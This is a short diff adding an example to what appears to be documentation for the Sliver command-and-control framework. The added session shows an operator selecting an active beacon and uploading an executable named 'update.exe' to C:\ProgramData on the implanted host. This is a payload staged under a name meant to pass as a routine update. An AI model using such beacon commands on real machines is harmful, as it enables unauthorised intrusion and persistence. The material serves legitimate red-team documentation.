@@ -388,3 +388,16 @@ sliver >
 
 ```
 
+```
+sliver > use 09253acf
+
+[*] Active beacon BLUSHING_ERROR (09253acf-c260-4332-b32c-3705a267d81b)
+
+sliver (BLUSHING_ERROR) >
+sliver (BLUSHING_ERROR) > upload /tmp/update.exe "C:\ProgramData\update.exe"
+
+[*] Tasked beacon BLUSHING_ERROR (00f0c14d)
+
+sliver (BLUSHING_ERROR) >
+
+```
